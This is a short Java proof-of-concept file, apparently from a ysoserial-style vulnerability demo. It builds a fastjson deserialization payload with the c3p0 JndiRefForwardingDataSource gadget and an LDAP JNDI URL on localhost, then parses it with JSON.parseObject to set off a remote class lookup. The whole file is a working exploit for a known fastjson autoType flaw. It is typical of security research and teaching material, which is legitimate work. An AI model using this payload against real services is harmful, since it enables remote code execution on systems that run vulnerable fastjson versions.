package ysoserial.vulndemo;


import com.alibaba.fastjson.JSON;

public class c3p0_fastjson {
    public static void main(String[] args){
        String poc = "{\"@type\": \"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",\n"+"\"jndiName\": \"ldap://127.0.0.1:1389/fvtvuj\",\n"+"\"loginTimeout\": 0}";
        JSON.parseObject(poc);
    }
}
